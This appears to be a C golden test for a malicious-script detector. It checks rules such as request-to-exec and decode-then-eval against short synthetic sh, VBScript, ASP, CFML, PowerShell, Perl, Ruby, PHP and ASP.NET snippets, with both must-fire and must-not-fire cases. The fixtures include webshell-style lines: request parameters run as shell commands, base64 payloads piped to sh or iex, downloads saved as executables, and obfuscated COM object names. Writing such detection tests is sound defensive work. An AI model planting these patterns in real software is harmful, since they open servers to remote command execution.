/*
 * diag_text_stmt_golden - the fixture diagnoses (tests/sigs/diagnoses/php_*.c: capabilities, no function named, so they apply to any language whose nodes the TEXT route makes)
 * against small SYNTHETIC scripts of the languages whose calls are written WITHOUT A BRACKET, through the whole engine: vbscript and classic asp, sh, batch, powershell, tcl, cfml,
 * perl and ruby's bare commands and backticks, php's backtick, jscript's COM and asp.net's `Request["x"]`. The file is typed (a shebang, a tag, `@echo off`, the objects it makes),
 * read by its lexer, its calls are the file's imports (the gate - for COM, the VBS table's names, found by the lib's own lookup) and its nodes and links are the scan.
 *
 * Each row is a diagnose, a text, and whether it must fire - the "must not" half is as much of the pin as the "must": a word inside echo, a pipe that is a ";", a request that is
 * only shown, a command in a string the lexer does not open, a block form of eval, a class the program did not name.
 *
 * Every text begins with padding: a script of a few dozen bytes is not read as one.
 */

#include "diag_text_fire.h"

#define PAD "padding padding padding padding padding padding padding padding"
#define SHH "#!/bin/sh\n# " PAD "\n"
#define BATH "@echo off\r\nrem " PAD "\r\n"
#define PSHH "#!/usr/bin/pwsh\n# " PAD "\n"
#define TCLH "#!/usr/bin/tclsh\n# " PAD "\n"
#define VBH "' " PAD "\nSet wsh = CreateObject(\"WScript.Network\")\n"
#define ASPH "<%@ LANGUAGE=\"VBSCRIPT\" %>\n<%\n' " PAD "\n"
#define ASPT "%>\n<html>padding padding padding</html>\n"
#define CFH "<!--- " PAD " --->\n"
#define JSCH "// " PAD "\nWScript.Echo(1);\n"
#define PLH "#!/usr/bin/perl\n# " PAD "\n"
#define RBH "#!/usr/bin/ruby\n# " PAD "\n"
#define PHPH "<?php\n// " PAD "\n"
#define AXH "<%@ Page Language=\"C#\" %>\n<!-- " PAD " -->\n"

static const struct row rows[] = {
	/* ---- sh: the first word of a command, and what a pipe carries ---- */
	{ "php_decode_exec", SHH "x=$QUERY_STRING\necho $x | base64 -d | sh\n", 1 },
	{ "php_decode_exec", SHH "echo $1 | base64 -d | bash\n", 1 },
	{ "php_decode_exec", SHH "sudo echo $1 | base64 -d | sudo bash\n", 1 },
	/* the pipe carries nothing into bash here (the redirection takes it), but the file is the one both name: a SHARED link joins the decode to the exec (diag_text_ident.c) and a diagnose
	 * that asks for no kind takes both. It was 0 while the route made produced links only; the relation is true - what was decoded is what is run. */
	{ "php_decode_exec", SHH "echo $1 | base64 -d > /tmp/a\nbash /tmp/a\n", 1 },
	{ "php_decode_exec", SHH "echo $1 | base64 -d; sh\necho $1 | base64 -d && sh\n", 0 },
	{ "php_decode_exec", SHH "echo \"base64 -d | sh\"\necho 'x | base64 -d | sh'\necho base64 -d | cat\n", 0 },
	{ "php_request_exec", SHH "cmd=$QUERY_STRING\nsh -c \"$cmd\"\n", 1 },
	{ "php_request_exec", SHH "echo $QUERY_STRING | sh\n", 1 },
	{ "php_request_exec", SHH "y=$(echo $HTTP_COOKIE)\nsh -c \"$y\"\n", 1 },
	{ "php_request_exec", SHH "cmd=$QUERY_STRING\nsh -c 'ls'\n", 0 },
	{ "php_request_exec", SHH "cmd=$QUERY_STRING\necho $cmd\nsh -c ls\n", 0 },
	{ "php_request_exec", SHH "cat <<EOF\necho $QUERY_STRING | sh\nEOF\n", 0 },
	{ "php_request_call", SHH "cmd=$QUERY_STRING\n$cmd\n", 1 },
	{ "php_request_call", SHH "cmd=ls\n$cmd\n", 0 },

	/* ---- vbscript: COM, the statements, built names ---- */
	{ "php_decode_eval", VBH "Set sh = CreateObject(\"WScript.Shell\")\nExecuteGlobal StrReverse(y)\n", 1 },
	{ "php_decode_eval", VBH "Set sh = CreateObject(\"WScript.Shell\")\nx = StrReverse(y)\nExecuteGlobal \"1\"\n", 0 },
	{ "php_built_exec", VBH "Set o = CreateObject(\"WScr\" & \"ipt.Shell\")\no.Run \"calc\"\n", 1 },
	{ "php_built_exec", VBH "Set o = CreateObject(\"WScript.Shell\")\no.Run \"calc\"\n", 0 },
	{ "php_built_exec", VBH "Set o = CreateObject(\"WScr\" & \"ipt.Shell\")\nSet c = CreateObject(\"ADODB.Connection\")\nc.Execute sql\n", 0 },

	/* ---- classic asp ---- */
	{ "php_request_exec", ASPH "cmd = Request.Form(\"c\")\nSet sh = Server.CreateObject(\"WScript.Shell\")\nsh.Run cmd, 0, True\n" ASPT, 1 },
	{ "php_request_exec", ASPH "Set sh = Server.CreateObject(\"WScript.Shell\")\nSet r = sh.Exec(Request(\"c\"))\n" ASPT, 1 },
	{ "php_request_eval", ASPH "Execute Request(\"x\")\n" ASPT, 1 },
	{ "php_request_write", ASPH "p = Request(\"p\")\nSet f = Server.CreateObject(\"Scripting.FileSystemObject\")\nSet t = f.CreateTextFile(p, True)\n" ASPT, 1 },
	{ "php_request_exec", ASPH "Set sh = Server.CreateObject(\"WScript.Shell\")\nsh.Run Request.ServerVariables(\"URL\")\n" ASPT, 0 },
	{ "php_request_exec", ASPH "x = Request(\"c\")\nSet sh = Server.CreateObject(\"WScript.Shell\")\nsh.Run \"ls\"\n" ASPT, 0 },
	{ "php_request_eval", ASPH "x = Request(\"c\")\nExecute \"1\"\n" ASPT, 0 },

	/* ---- cfml ---- */
	{ "php_request_exec", CFH "<cfexecute name=\"cmd.exe\" arguments=\"/c #form.cmd#\"></cfexecute>\n", 1 },
	{ "php_request_exec", CFH "<cfset c = url.c>\n<cfexecute name=\"#c#\"></cfexecute>\n", 1 },
	{ "php_request_exec", CFH "<cfscript>rt = createObject(\"java\", \"java.lang.Runtime\");\nrt.getRuntime().exec(url.c);</cfscript>\n", 1 },
	{ "php_request_eval", CFH "<cfscript>Evaluate(form.e);</cfscript>\n", 1 },
	{ "php_request_exec", CFH "<cfexecute name=\"ls\"></cfexecute>\n<cfoutput>#form.cmd#</cfoutput>\n", 0 },
	{ "php_request_exec", CFH "<cfset c = form.cmd>\n<cfexecute name=\"ls\" arguments=\"c\"></cfexecute>\n", 0 },

	/* ---- powershell ---- */
	{ "php_decode_eval", PSHH "$p = [Convert]::FromBase64String($s)\n$p | iex\n", 1 },
	{ "php_decode_eval", PSHH "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))\n", 1 },
	{ "php_decode_load", PSHH "$b = [Convert]::FromBase64String($s)\n[Reflection.Assembly]::Load($b)\n", 1 },
	{ "php_fetch_write", PSHH "Invoke-WebRequest http://x | Set-Content c:\\a.exe\n", 1 },
	{ "php_fetch_write", PSHH "$wc = New-Object Net.WebClient\n$d = $wc.DownloadString('http://x')\nSet-Content c:\\a.exe $d\n", 1 },
	{ "php_fetch_write", PSHH "Invoke-WebRequest http://x\nSet-Content c:\\a.exe 1\n", 0 },
	{ "php_decode_eval", PSHH "Write-Host iex $p\n$q = [Convert]::FromBase64String($s)\n", 0 },
	{ "php_decode_eval", PSHH "$p = [Convert]::FromBase64String($s)\n'iex'\n\"$p\"\n", 0 },

	/* ---- tcl: the top level of a file, not the braces ---- */
	{ "php_request_exec", TCLH "exec [ncgi::value cmd]\n", 1 },
	{ "php_request_exec", TCLH "proc f {} { exec [ncgi::value cmd] }\n", 0 },

	/* ---- jscript's COM objects are the VBS table's ---- */
	{ "php_request_exec", JSCH "var sh = new ActiveXObject(\"WScript.Shell\");\nsh.Run(req.query.c);\n", 1 },
	{ "php_built_exec", JSCH "var sh = new ActiveXObject(\"WScr\" + \"ipt.Shell\");\nsh.Run(\"calc\");\n", 1 },
	{ "php_request_exec", JSCH "var sh = new ActiveXObject(\"WScript.Network\");\nsh.Run(req.query.c);\n", 0 },

	/* ---- perl and ruby: a command with no bracket, the backtick ---- */
	{ "php_request_exec", PLH "my $c = $ENV{QUERY_STRING};\nsystem \"ls $c\";\n", 1 },
	{ "php_request_exec", PLH "my $c = $ENV{QUERY_STRING};\nmy $o = `ls $c`;\n", 1 },
	{ "php_request_exec", PLH "my $o = qx{ls $ENV{QUERY_STRING}};\n", 1 },
	{ "php_request_eval", PLH "my $c = $ENV{QUERY_STRING};\neval $c;\n", 1 },
	{ "php_request_eval", PLH "my $c = $ENV{QUERY_STRING};\neval { system(\"ls\") };\n", 0 },
	{ "php_request_exec", PLH "my $c = $ENV{QUERY_STRING};\nsystem 'ls $c';\n", 0 },
	{ "php_request_exec", RBH "cmd = params[:c]\nsystem \"ls #{cmd}\"\n", 1 },
	{ "php_request_exec", RBH "x = `ls #{params[:q]}`\n", 1 },
	{ "php_request_exec", RBH "cmd = params[:c]\nexec \"sh\", cmd\n", 1 },
	{ "php_request_exec", RBH "cmd = params[:c]\nsystem 'ls #{cmd}'\n", 0 },
	{ "php_request_eval", RBH "instance_eval do\n  puts params[:z]\nend\n", 0 },

	/* ---- php: the backtick is a command ---- */
	{ "php_request_exec", PHPH "$o = `ls {$_GET['c']}`;\n", 1 },
	{ "php_request_exec", PHPH "$c = $_GET['c'];\n$o = `ls $c`;\n", 1 },
	{ "php_request_exec", PHPH "$c = $_GET['c'];\n$o = `ls`;\n", 0 },
	{ "php_request_exec", PHPH "$c = $_GET['c'];\n$o = \"ls `$c`\";\n", 0 },

	/* ---- asp.net: the request through an index or a call, a control's text ---- */
	{ "php_request_exec", AXH "<script runat=\"server\">\nvoid f() { string c = Request[\"c\"]; Process.Start(c); }\n</script>\n", 1 },
	{ "php_request_exec", AXH "<script runat=\"server\">\nvoid f() { Process.Start(txtArg.Text); }\n</script>\n", 1 },
	{ "php_request_exec", AXH "<script runat=\"server\">\nvoid f() { lblOut.Text = \"x\"; Process.Start(\"calc\"); }\n</script>\n", 0 },
	{ "php_request_exec", AXH "<script runat=\"server\">\nvoid f(Box b) { Process.Start(b.Text); }\n</script>\n", 0 },
};

int main(int argc, char **argv)
{
	if (!e2e_open(argc > 1 ? argv[1] : NULL)) {
		printf("diag text stmt golden: cannot open the test database\n");
		return 2;
	}
	fire_rows(rows, sizeof rows / sizeof rows[0]);
	/* a plain script of each language has no verdict at all, and a command only mentioned is not run */
	CK(fires_any(SHH "echo hello\nls -l /tmp\n") == 0);
	CK(fires_any(SHH "echo curl http://x | cat\n# wget x | sh\n") == 0);
	CK(fires_any(BATH "echo certutil -decode a b\r\necho hello\r\ndir\r\n") == 0);
	CK(fires_any(BATH "echo powershell -c x\r\nrem cmd /c y\r\n") == 0);
	CK(fires_any(PSHH "Write-Host hello\nGet-ChildItem\n") == 0);
	CK(fires_any(TCLH "puts hello\nset x 1\n") == 0);
	CK(fires_any(VBH "MsgBox \"hello\"\nx = 1\n") == 0);
	CK(fires_any(ASPH "Response.Write \"hello\"\nx = Request.ServerVariables(\"URL\")\n" ASPT) == 0);
	CK(fires_any(CFH "<cfoutput>hello</cfoutput>\n<cfset x = 1>\n") == 0);
	printf("diag text stmt golden: %s\n", fails ? "FAILED" : "ok");
	return fails != 0;
}
